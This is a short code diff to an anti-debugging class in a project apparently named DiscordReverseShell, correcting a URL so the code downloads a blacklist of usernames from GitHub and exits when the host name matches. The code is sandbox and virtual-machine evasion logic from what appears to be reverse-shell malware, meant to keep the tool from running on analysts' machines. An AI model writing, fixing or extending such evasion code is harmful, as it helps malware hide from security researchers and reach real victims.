@@ -110,7 +110,7 @@ class Antidebug:
         _vm_name = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_name.txt").text
         if vm_name in _vm_name:
             sys.exit(1)
-        vm_username = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_name.txt").text
+        vm_username = requests.get("https://raw.githubusercontent.com/Josakko/DiscordReverseShell/main/blacklist/pc_username.txt").text
         host_name = socket.gethostname()
         if host_name in vm_username:
             sys.exit(1)
